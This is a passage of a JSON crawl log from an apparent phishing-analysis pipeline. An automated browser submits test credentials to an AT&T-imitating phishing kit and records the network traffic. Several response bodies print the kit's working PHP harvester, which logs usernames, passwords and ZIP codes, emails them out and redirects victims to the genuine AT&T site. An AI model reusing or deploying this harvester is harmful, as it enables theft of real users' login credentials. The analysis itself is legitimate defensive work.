+              "lastEventTs": 1778030507327,
+              "requestSentTs": 276133.051479,
+              "responseReceivedTs": 276133.056086,
+              "loadingFinishedTs": 276133.055573,
+              "latencyMs": 4.1,
+              "ttfbMs": 4.6,
+              "_native_submit": true,
+              "_submit_trigger_ts_ms": 1778030507258
+            }
+          ],
+          "note": "native browser submit observed via CDP only; JS context may have been destroyed by navigation"
+        },
+        "submit_click_logs": {
+          "step": 1,
+          "phase": "submit_click",
+          "domChanges": [],
+          "networkReqs": [
+            {
+              "step": 1,
+              "phase": "submit_click",
+              "type": "xhr",
+              "method": "POST",
+              "url": "verify.php",
+              "requestHeaders": {
+                "Content-Type": "application/x-www-form-urlencoded"
+              },
+              "requestContentType": "application/x-www-form-urlencoded",
+              "requestBody": "style=ATTidp&targetURL=https%3A%2F%2Floginprodx.att.net%2FFIM%2Fsps%2FATTidp%2Fsaml20%2Flogininitial%3FRequestBinding%3DHTTPPost%26PartnerId%3Dhttps%3A%2F%2Flogin.yahoo.com%2Fsaml%2F2.0%2Fatt%26.lang%3Den-US%26Target%3Dhttps%253a%2F%2Fatt.yahoo.com%2F%253f.lts%3D1415577160&userid=uahgmqamserm&password=cA16p9AM&showPwd=on&rememberID=on",
+              "callStack": "Error: __fa_xhr_trace\n    at XMLHttpRequest.send (<anonymous>:198:17)\n    at HTMLDocument.eval (eval at executeScript (:416:16), <anonymous>:58:25)",
+              "status": 200,
+              "response": "<?\r\n\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"---- : || tHAnks tO Crossr!d3r || :------\\n\";\r\n$message .= \"User ID/Email Address           : \".$_POST['userid'].\"\\n\";\r\n$message .= \"Password               : \".$_POST['password'].\"\\n\";\r\n$message .= \"Service Address Zip             : \".$_POST['zipxnx'].\"\\n\";\r\n$message .= \"----: || tHAnks tO Crossr!d3r || :------\\n\";\r\n$message .= \"IP: \".$ip.\"\\n\";\r\n\r\n\r\n$recipient = \"[REDACTED_EMAIL_3070849d]\r\n\";\r\n\r\n\r\n$fp = fopen(\"SUre.txt\",\"a\");\r\nfputs($fp,$message);\r\nfclose($fp);\r\n\r\n\r\n\r\n\r\n\r\n$subject = \"ATT US | \".$ip.\"\\n\";\r\n\r\nmail($recipient,$subject,$message);\r\nheader(\"Location:   https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=error&appName=m40842&errorCode=902.2\");\r\n?>\r\n\r\n\r\n",
+              "responseHeaders": {
+                "connection": "Keep-Alive",
+                "content-encoding": "gzip",
+                "content-length": "402",
+                "content-type": "text/html; charset=UTF-8",
+                "date": "Wed, 06 May 2026 01:21:50 GMT",
+                "keep-alive": "timeout=5, max=45",
+                "server": "Apache/2.4.58 (Ubuntu)",
+                "vary": "Accept-Encoding"
+              },
+              "responseContentType": "text/html; charset=UTF-8",
+              "responseReturned": true,
+              "redirected": true,
+              "finalUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/verify.php",
+              "responseBodyLength": 730,
+              "timestamp": 1778030510305,
+              "latencyMs": 13,
+              "ttfbMs": null,
+              "resolved_server": {
+                "server_file": "ATT/verify.php",
+                "receives_fields": [
+                  "password",
+                  "userid",
+                  "zipxnx"
+                ],
+                "actions": [
+                  {
+                    "type": "mail",
+                    "target": "[REDACTED_EMAIL]",
+                    "variable": "$recipient",
+                    "line": 26
+                  },
+                  {
+                    "type": "redirect",
+                    "target": "https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=error&appName=m40842&errorCode=902.2",
+                    "line": 27
+                  }
+                ],
+                "exfil": [
+                  "email:[REDACTED_EMAIL]"
+                ]
+              }
+            }
+          ],
+          "firedEvents": [
+            {
+              "step": 1,
+              "phase": "submit_click",
+              "eventType": "mouseover",
+              "targetXPath": "//*[@id=\"submitLogin\"]",
+              "targetTag": "INPUT",
+              "targetName": "",
+              "targetType": "submit",
+              "targetValue": "Sign In",
+              "key": null,
+              "keyCode": null,
+              "defaultPrevented": false,
+              "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+              "timestamp": 1778030510303
+            },
+            {
+              "step": 1,
+              "phase": "submit_click",
+              "eventType": "mousedown",
+              "targetXPath": "//*[@id=\"submitLogin\"]",
+              "targetTag": "INPUT",
+              "targetName": "",
+              "targetType": "submit",
+              "targetValue": "Sign In",
+              "key": null,
+              "keyCode": null,
+              "defaultPrevented": false,
+              "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+              "timestamp": 1778030510303
+            },
+            {
+              "step": 1,
+              "phase": "submit_click",
+              "eventType": "focus",
+              "targetXPath": "//*[@id=\"submitLogin\"]",
+              "targetTag": "INPUT",
+              "targetName": "",
+              "targetType": "submit",
+              "targetValue": "Sign In",
+              "key": null,
+              "keyCode": null,
+              "defaultPrevented": false,
+              "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+              "timestamp": 1778030510303
+            },
+            {
+              "step": 1,
+              "phase": "submit_click",
+              "eventType": "mouseup",
+              "targetXPath": "//*[@id=\"submitLogin\"]",
+              "targetTag": "INPUT",
+              "targetName": "",
+              "targetType": "submit",
+              "targetValue": "Sign In",
+              "key": null,
+              "keyCode": null,
+              "defaultPrevented": false,
+              "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+              "timestamp": 1778030510304
+            },
+            {
+              "step": 1,
+              "phase": "submit_click",
+              "eventType": "click",
+              "targetXPath": "//*[@id=\"submitLogin\"]",
+              "targetTag": "INPUT",
+              "targetName": "",
+              "targetType": "submit",
+              "targetValue": "Sign In",
+              "key": null,
+              "keyCode": null,
+              "defaultPrevented": false,
+              "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+              "timestamp": 1778030510304
+            },
+            {
+              "step": 1,
+              "phase": "submit_click",
+              "eventType": "submit",
+              "targetXPath": "//*[@id=\"LoginForm\"]",
+              "targetTag": "FORM",
+              "targetName": "LoginForm",
+              "targetType": "",
+              "targetValue": "",
+              "key": null,
+              "keyCode": null,
+              "defaultPrevented": false,
+              "callStack": "Error: __fa_event_trace\n    at HTMLDocument.<anonymous> (<anonymous>:356:21)",
+              "timestamp": 1778030510305
+            }
+          ],
+          "html5Validation": [],
+          "triggeredFunctions": [],
+          "cdpNetworkReqs": [
+            {
+              "requestId": "780051.47",
+              "sequence": 11,
+              "resourceType": "XHR",
+              "initiatorType": "script",
+              "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+              "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/verify.php",
+              "method": "POST",
+              "requestHeaders": {
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+              },
+              "requestHeaderNames": [
+                "Content-Type",
+                "Referer",
+                "User-Agent"
+              ],
+              "requestContentType": "application/x-www-form-urlencoded",
+              "hasCookieHeader": true,
+              "associatedCookies": [
+                {
+                  "blockedReasons": [],
+                  "cookie": {
+                    "domain": "www.2026.com",
+                    "expires": -1,
+                    "httpOnly": false,
+                    "name": "IV_JCT",
+                    "path": "/",
+                    "priority": "Medium",
+                    "sameParty": false,
+                    "secure": false,
+                    "session": true,
+                    "size": 20,
+                    "sourcePort": 8080,
+                    "sourceScheme": "NonSecure",
+                    "value": "%2FcommonLogin"
+                  },
+                  "exemptionReason": "None"
+                }
+              ],
+              "customRequestHeaders": {},
+              "postData": "style=ATTidp&targetURL=https%3A%2F%2Floginprodx.att.net%2FFIM%2Fsps%2FATTidp%2Fsaml20%2Flogininitial%3FRequestBinding%3DHTTPPost%26PartnerId%3Dhttps%3A%2F%2Flogin.yahoo.com%2Fsaml%2F2.0%2Fatt%26.lang%3Den-US%26Target%3Dhttps%253a%2F%2Fatt.yahoo.com%2F%253f.lts%3D1415577160&userid=uahgmqamserm&password=cA16p9AM&showPwd=on&rememberID=on",
+              "status": 200,
+              "statusText": "OK",
+              "redirected": false,
+              "redirectChain": [],
+              "redirectLocation": "",
+              "responseHeaders": {
+                "Connection": "Keep-Alive",
+                "Content-Encoding": "gzip",
+                "Content-Length": "402",
+                "Content-Type": "text/html; charset=UTF-8",
+                "Date": "Wed, 06 May 2026 01:21:50 GMT",
+                "Keep-Alive": "timeout=5, max=45",
+                "Server": "Apache/2.4.58 (Ubuntu)",
+                "Vary": "Accept-Encoding"
+              },
+              "responseContentType": "text/html; charset=UTF-8",
+              "hasSetCookie": false,
+              "responseReturned": true,
+              "responseBodyPreview": "<?\r\n\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"---- : || tHAnks tO Crossr!d3r || :------\\n\";\r\n$message .= \"User ID/Email Address           : \".$_POST['userid'].\"\\n\";\r\n$message .= \"Password               : \".$_POST['password'].\"\\n\";\r\n$message .= \"Service Address Zip             : \".$_POST['zipxnx'].\"\\n\";\r\n$message .= \"----: || tHAnks tO Crossr!d3r || :------\\n\";\r\n$message .= \"IP: \".$ip.\"\\n\";\r\n\r\n\r\n$recipient = \"[REDACTED_EMAIL_3070849d]\r\n\";\r\n\r\n\r\n$fp = fopen(\"SUre.txt\",\"a\");\r\nfputs($fp,$message);\r\nfclose($fp);\r\n\r\n\r\n\r\n\r\n\r\n$subject = \"ATT US | \".$ip.\"\\n\";\r\n\r\nmail($recipient,$subject,$message);\r\nheader(\"Location:   https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=error&appName=m40842&errorCode=902.2\");\r\n?>\r\n\r\n\r\n",
+              "responseBodyLength": 730,
+              "loadingFinished": true,
+              "loadingFailed": false,
+              "errorText": "",
+              "encodedDataLength": 653,
+              "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/verify.php",
+              "mimeType": "text/html",
+              "protocol": "http/1.1",
+              "timestamp": 276136.050356,
+              "lastEventTs": 1778030510810,
+              "requestSentTs": 276136.050356,
+              "responseReceivedTs": 276136.061492,
+              "loadingFinishedTs": 276136.053815,
+              "latencyMs": 3.5,
+              "ttfbMs": 11.1,
+              "_timing_summary": {
+                "latencyMs": 3.5,
+                "ttfbMs": 11.1,
+                "protocol": "http/1.1",
+                "redirected": false,
+                "redirectChain": [],
+                "status": 200,
+                "hasCookieHeader": true,
+                "hasSetCookie": false
+              }
+            }
+          ],
+          "jqueryDispatchLogs": []
+        },
+        "submit_trigger_ts_ms": 1778030510272,
+        "submit_timing": {
+          "python_click_ts_ms": 1778030510272,
+          "js_trigger_event_ts_ms": 1778030510304,
+          "js_first_req_ts_ms": 1778030510305,
+          "event_to_request_ms": 1,
+          "cdp_req_count": 1
+        },
+        "submit_detail": {
+          "action": "verify.php",
+          "fields": {
+            "password": "cA16p9AM",
+            "rememberID": "on",
+            "showPwd": "on",
+            "style": "ATTidp",
+            "targetURL": "https://loginprodx.att.net/FIM/sps/ATTidp/saml20/logininitial?RequestBinding=HTTPPost&PartnerId=https://login.yahoo.com/saml/2.0/att&.lang=en-US&Target=https%3a//att.yahoo.com/%3f.lts=1415577160",
+            "userid": "uahgmqamserm"
+          },
+          "method": "POST",
+          "responseContentType": "text/html; charset=UTF-8",
+          "responseLength": 730,
+          "status": 200,
+          "submitted": true,
+          "cdp_network": [
+            {
+              "requestId": "780051.47",
+              "sequence": 11,
+              "resourceType": "XHR",
+              "initiatorType": "script",
+              "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+              "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/verify.php",
+              "method": "POST",
+              "requestHeaders": {
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+              },
+              "requestHeaderNames": [
+                "Content-Type",
+                "Referer",
+                "User-Agent"
+              ],
+              "requestContentType": "application/x-www-form-urlencoded",
+              "hasCookieHeader": true,
+              "associatedCookies": [
+                {
+                  "blockedReasons": [],
+                  "cookie": {
+                    "domain": "www.2026.com",
+                    "expires": -1,
+                    "httpOnly": false,
+                    "name": "IV_JCT",
+                    "path": "/",
+                    "priority": "Medium",
+                    "sameParty": false,
+                    "secure": false,
+                    "session": true,
+                    "size": 20,
+                    "sourcePort": 8080,
+                    "sourceScheme": "NonSecure",
+                    "value": "%2FcommonLogin"
+                  },
+                  "exemptionReason": "None"
+                }
+              ],
+              "customRequestHeaders": {},
+              "postData": "style=ATTidp&targetURL=https%3A%2F%2Floginprodx.att.net%2FFIM%2Fsps%2FATTidp%2Fsaml20%2Flogininitial%3FRequestBinding%3DHTTPPost%26PartnerId%3Dhttps%3A%2F%2Flogin.yahoo.com%2Fsaml%2F2.0%2Fatt%26.lang%3Den-US%26Target%3Dhttps%253a%2F%2Fatt.yahoo.com%2F%253f.lts%3D1415577160&userid=uahgmqamserm&password=cA16p9AM&showPwd=on&rememberID=on",
+              "status": 200,
+              "statusText": "OK",
+              "redirected": false,
+              "redirectChain": [],
+              "redirectLocation": "",
+              "responseHeaders": {
+                "Connection": "Keep-Alive",
+                "Content-Encoding": "gzip",
+                "Content-Length": "402",
+                "Content-Type": "text/html; charset=UTF-8",
+                "Date": "Wed, 06 May 2026 01:21:50 GMT",
+                "Keep-Alive": "timeout=5, max=45",
+                "Server": "Apache/2.4.58 (Ubuntu)",
+                "Vary": "Accept-Encoding"
+              },
+              "responseContentType": "text/html; charset=UTF-8",
+              "hasSetCookie": false,
+              "responseReturned": true,
+              "responseBodyPreview": "<?\r\n\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"---- : || tHAnks tO Crossr!d3r || :------\\n\";\r\n$message .= \"User ID/Email Address           : \".$_POST['userid'].\"\\n\";\r\n$message .= \"Password               : \".$_POST['password'].\"\\n\";\r\n$message .= \"Service Address Zip             : \".$_POST['zipxnx'].\"\\n\";\r\n$message .= \"----: || tHAnks tO Crossr!d3r || :------\\n\";\r\n$message .= \"IP: \".$ip.\"\\n\";\r\n\r\n\r\n$recipient = \"[REDACTED_EMAIL_3070849d]\r\n\";\r\n\r\n\r\n$fp = fopen(\"SUre.txt\",\"a\");\r\nfputs($fp,$message);\r\nfclose($fp);\r\n\r\n\r\n\r\n\r\n\r\n$subject = \"ATT US | \".$ip.\"\\n\";\r\n\r\nmail($recipient,$subject,$message);\r\nheader(\"Location:   https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=error&appName=m40842&errorCode=902.2\");\r\n?>\r\n\r\n\r\n",
+              "responseBodyLength": 730,
+              "loadingFinished": true,
+              "loadingFailed": false,
+              "errorText": "",
+              "encodedDataLength": 653,
+              "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/verify.php",
+              "mimeType": "text/html",
+              "protocol": "http/1.1",
+              "timestamp": 276136.050356,
+              "lastEventTs": 1778030510810,
+              "requestSentTs": 276136.050356,
+              "responseReceivedTs": 276136.061492,
+              "loadingFinishedTs": 276136.053815,
+              "latencyMs": 3.5,
+              "ttfbMs": 11.1,
+              "_timing_summary": {
+                "latencyMs": 3.5,
+                "ttfbMs": 11.1,
+                "protocol": "http/1.1",
+                "redirected": false,
+                "redirectChain": [],
+                "status": 200,
+                "hasCookieHeader": true,
+                "hasSetCookie": false
+              }
+            }
+          ]
+        }
+      },
+      "overall_classification": "Case B: Server Round-trip (AJAX)",
+      "field_stats": {
+        "dom_analysable": 4,
+        "visible_now": 4,
+        "hidden_or_collapsed": 0
+      },
+      "static_action_analysis": {
+        "server_file": "ATT/verify.php",
+        "receives_fields": [
+          "password",
+          "userid",
+          "zipxnx"
+        ],
+        "actions": [
+          {
+            "type": "mail",
+            "target": "[REDACTED_EMAIL]",
+            "variable": "$recipient",
+            "line": 26
+          },
+          {
+            "type": "redirect",
+            "target": "https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=error&appName=m40842&errorCode=902.2",
+            "line": 27
+          }
+        ],
+        "exfil": [
+          "email:[REDACTED_EMAIL]"
+        ]
+      },
+      "page_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm"
+    }
+  ],
+  "visited_urls": [
+    {
+      "step": 1,
+      "requested_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+      "actual_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+      "method": "get"
+    },
+    {
+      "step": 2,
+      "requested_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/verify.php",
+      "actual_url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/verify.php",
+      "method": "get"
+    }
+  ],
+  "cdp_network": [
+    {
+      "requestId": "348D95E2C4EED52FAE3DF31D07DD834B",
+      "sequence": 1,
+      "resourceType": "Document",
+      "initiatorType": "other",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/verify.php",
+      "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/verify.php",
+      "method": "POST",
+      "requestHeaders": {
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Accept-Encoding": "gzip, deflate",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Cache-Control": "no-cache",
+        "Connection": "keep-alive",
+        "Content-Length": "331",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Cookie": "IV_JCT=%2FcommonLogin",
+        "Host": "www.2026.com:8080",
+        "Origin": "http://www.2026.com:8080",
+        "Pragma": "no-cache",
+        "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+        "Upgrade-Insecure-Requests": "1",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+      },
+      "requestHeaderNames": [
+        "Accept",
+        "Accept-Encoding",
+        "Accept-Language",
+        "Cache-Control",
+        "Connection",
+        "Content-Length",
+        "Content-Type",
+        "Cookie",
+        "Host",
+        "Origin",
+        "Pragma",
+        "Referer",
+        "Upgrade-Insecure-Requests",
+        "User-Agent"
+      ],
+      "requestContentType": "application/x-www-form-urlencoded",
+      "hasCookieHeader": true,
+      "associatedCookies": [
+        {
+          "blockedReasons": [],
+          "cookie": {
+            "domain": "www.2026.com",
+            "expires": -1,
+            "httpOnly": false,
+            "name": "IV_JCT",
+            "path": "/",
+            "priority": "Medium",
+            "sameParty": false,
+            "secure": false,
+            "session": true,
+            "size": 20,
+            "sourcePort": 8080,
+            "sourceScheme": "NonSecure",
+            "value": "%2FcommonLogin"
+          },
+          "exemptionReason": "None"
+        }
+      ],
+      "customRequestHeaders": {},
+      "postData": "style=ATTidp&targetURL=https%3A%2F%2Floginprodx.att.net%2FFIM%2Fsps%2FATTidp%2Fsaml20%2Flogininitial%3FRequestBinding%3DHTTPPost%26PartnerId%3Dhttps%3A%2F%2Flogin.yahoo.com%2Fsaml%2F2.0%2Fatt%26.lang%3Den-US%26Target%3Dhttps%253a%2F%2Fatt.yahoo.com%2F%253f.lts%3D1415577160&userid=lgelzj&password=eVLJMJwyz&showPwd=on&rememberID=on",
+      "status": 200,
+      "statusText": "OK",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {
+        "Connection": "Keep-Alive",
+        "Content-Encoding": "gzip",
+        "Content-Length": "402",
+        "Content-Type": "text/html; charset=UTF-8",
+        "Date": "Wed, 06 May 2026 01:21:47 GMT",
+        "Keep-Alive": "timeout=5, max=48",
+        "Server": "Apache/2.4.58 (Ubuntu)",
+        "Vary": "Accept-Encoding"
+      },
+      "responseContentType": "text/html; charset=UTF-8",
+      "hasSetCookie": false,
+      "responseReturned": true,
+      "responseBodyPreview": "<?\r\n\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"---- : || tHAnks tO Crossr!d3r || :------\\n\";\r\n$message .= \"User ID/Email Address           : \".$_POST['userid'].\"\\n\";\r\n$message .= \"Password               : \".$_POST['password'].\"\\n\";\r\n$message .= \"Service Address Zip             : \".$_POST['zipxnx'].\"\\n\";\r\n$message .= \"----: || tHAnks tO Crossr!d3r || :------\\n\";\r\n$message .= \"IP: \".$ip.\"\\n\";\r\n\r\n\r\n$recipient = \"[REDACTED_EMAIL_3070849d]\r\n\";\r\n\r\n\r\n$fp = fopen(\"SUre.txt\",\"a\");\r\nfputs($fp,$message);\r\nfclose($fp);\r\n\r\n\r\n\r\n\r\n\r\n$subject = \"ATT US | \".$ip.\"\\n\";\r\n\r\nmail($recipient,$subject,$message);\r\nheader(\"Location:   https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=error&appName=m40842&errorCode=902.2\");\r\n?>\r\n\r\n\r\n",
+      "responseBodyLength": 730,
+      "loadingFinished": true,
+      "loadingFailed": false,
+      "errorText": "",
+      "encodedDataLength": 653,
+      "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/verify.php",
+      "mimeType": "text/html",
+      "protocol": "http/1.1",
+      "timestamp": 276133.051479,
+      "lastEventTs": 1778030507327,
+      "requestSentTs": 276133.051479,
+      "responseReceivedTs": 276133.056086,
+      "loadingFinishedTs": 276133.055573,
+      "latencyMs": 4.1,
+      "ttfbMs": 4.6,
+      "_native_submit": true,
+      "_submit_trigger_ts_ms": 1778030507258
+    },
+    {
+      "requestId": "955BA4ADD96CE06039D9F1B12C9E386B",
+      "sequence": 2,
+      "resourceType": "Document",
+      "initiatorType": "other",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+      "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+      "method": "GET",
+      "requestHeaders": {
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Accept-Encoding": "gzip, deflate",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Cache-Control": "no-cache",
+        "Connection": "keep-alive",
+        "Cookie": "IV_JCT=%2FcommonLogin",
+        "Host": "www.2026.com:8080",
+        "Pragma": "no-cache",
+        "Upgrade-Insecure-Requests": "1",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+      },
+      "requestHeaderNames": [
+        "Accept",
+        "Accept-Encoding",
+        "Accept-Language",
+        "Cache-Control",
+        "Connection",
+        "Cookie",
+        "Host",
+        "Pragma",
+        "Upgrade-Insecure-Requests",
+        "User-Agent"
+      ],
+      "requestContentType": "",
+      "hasCookieHeader": true,
+      "associatedCookies": [
+        {
+          "blockedReasons": [],
+          "cookie": {
+            "domain": "www.2026.com",
+            "expires": -1,
+            "httpOnly": false,
+            "name": "IV_JCT",
+            "path": "/",
+            "priority": "Medium",
+            "sameParty": false,
+            "secure": false,
+            "session": true,
+            "size": 20,
+            "sourcePort": 8080,
+            "sourceScheme": "NonSecure",
+            "value": "%2FcommonLogin"
+          },
+          "exemptionReason": "None"
+        }
+      ],
+      "customRequestHeaders": {},
+      "postData": null,
+      "status": 200,
+      "statusText": "OK",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {
+        "Accept-Ranges": "bytes",
+        "Connection": "Keep-Alive",
+        "Content-Encoding": "gzip",
+        "Content-Length": "2911",
+        "Content-Type": "text/html",
+        "Date": "Wed, 06 May 2026 01:21:47 GMT",
+        "ETag": "\"1d7d-60ec5155c9880-gzip\"",
+        "Keep-Alive": "timeout=5, max=47",
+        "Last-Modified": "Fri, 12 Jan 2024 19:58:10 GMT",
+        "Server": "Apache/2.4.58 (Ubuntu)",
+        "Vary": "Accept-Encoding"
+      },
+      "responseContentType": "text/html",
+      "hasSetCookie": false,
+      "responseReturned": true,
+      "responseBodyPreview": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\r\n\r\n\r\n\r\n\t\r\n\r\n\r\n\t\r\n\r\n\r\n<html lang=\"en\" xml:lang=\"en\" xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n<head>\r\n\r\n<title>AT&amp;T - Login</title>\r\n\r\n<!-- TG1403 S4055 - iframe -->\r\n<style id=\"antiClickjack\">body{display:none !important;}</style>\r\n<script type=\"text/javascript\">\r\n   if (self === top) {\r\n       var antiClickjack = document.getElementById(\"antiClickjack\");\r\n       antiClickjack.parentNode.removeChild(antiClickjack);\r\n   } else {\r\n   \tvar noFrameBusting = false;\r\n   \tif( ! noFrameBusting ) {\r\n       top.location = self.location;\r\n   \t}\r\n   }\r\n</script>\r\n\r\n<script type=\"text/javascript\">\r\n(function() {\r\n         if (\"-ms-user-select\" in document.documentElement.style && navigator.userAgent.match(/IEMobile\\/10\\.0/)) {\r\n                 var msViewportStyle = document.createElement(\"style\");\r\n                 msViewportStyle.appendChild(\r\n                          document.createTextNode(\"@-ms-viewport{width:auto!important}\")\r\n                 );\r\n                 document.getElementsByTagName(\"head\")[0].appendChild(msViewportStyle);\r\n         }\r\n})();\r\n</script>\r\n\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\r\n\r\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, minimum-scale=0.5, maximum-scale=1.0\" />\r\n\r\n<link rel=\"stylesheet\" href=\"https://home.secureapp.att.net/css/sso/slid/1201/main.css\"  type=\"text/css\" media=\"screen\" />\r\n\r\n<!--[if lte IE 6]>\r\n\r\n<link rel=\"stylesheet\" href=\"https://home.secureapp.att.net/css/sso/slid/1201/ie6.css\"  type=\"text/css\" media=\"screen\" />\r\n\r\n<![endif]-->\r\n\r\n<!--[if IE 7]>\r\n\r\n<link rel=\"stylesheet\" href=\"https://home.secureapp.att.net/css/sso/slid/1201/ie7.css\"  type=\"text/css\" media=\"screen\" />\r\n\r\n<![endif]-->\r\n\r\n<!--[if IE 8]>\r\n\r\n<link rel=\"stylesheet\" href=\"https://home.secureapp.att.net/css/sso/slid/1201/ie8.css\"  type=\"text/css\" media=\"screen\" />\r\n\r\n<![endif]-->\r\n\r\n<lin",
+      "responseBodyLength": 7549,
+      "loadingFinished": true,
+      "loadingFailed": false,
+      "errorText": "",
+      "encodedDataLength": 3249,
+      "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+      "mimeType": "text/html",
+      "protocol": "http/1.1",
+      "timestamp": 276133.600484,
+      "lastEventTs": 1778030507889,
+      "requestSentTs": 276133.600484,
+      "responseReceivedTs": 276133.61053,
+      "loadingFinishedTs": 276133.610201,
+      "latencyMs": 9.7,
+      "ttfbMs": 10.0
+    },
+    {
+      "requestId": "780051.33",
+      "sequence": 3,
+      "resourceType": "Stylesheet",
+      "initiatorType": "parser",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+      "url": "https://home.secureapp.att.net/css/sso/slid/1201/main.css",
+      "method": "GET",
+      "requestHeaders": {
+        "Referer": "http://www.2026.com:8080/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "sec-ch-ua": "\"Chromium\";v=\"145\", \"Not:A-Brand\";v=\"99\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Linux\""
+      },
+      "requestHeaderNames": [
+        "Referer",
+        "User-Agent",
+        "sec-ch-ua",
+        "sec-ch-ua-mobile",
+        "sec-ch-ua-platform"
+      ],
+      "requestContentType": "",
+      "hasCookieHeader": false,
+      "associatedCookies": [],
+      "customRequestHeaders": {},
+      "postData": null,
+      "status": null,
+      "statusText": "",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {},
+      "responseContentType": "",
+      "hasSetCookie": false,
+      "responseReturned": false,
+      "responseBodyPreview": null,
+      "responseBodyLength": null,
+      "loadingFinished": false,
+      "loadingFailed": true,
+      "errorText": "net::ERR_INTERNET_DISCONNECTED",
+      "encodedDataLength": null,
+      "responseUrl": "",
+      "mimeType": "",
+      "protocol": "",
+      "timestamp": 276133.616427,
+      "lastEventTs": 1778030507884,
+      "requestSentTs": 276133.616427,
+      "responseReceivedTs": 0.0,
+      "loadingFinishedTs": 0.0,
+      "latencyMs": null,
+      "ttfbMs": null
+    },
+    {
+      "requestId": "780051.34",
+      "sequence": 4,
+      "resourceType": "Script",
+      "initiatorType": "parser",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
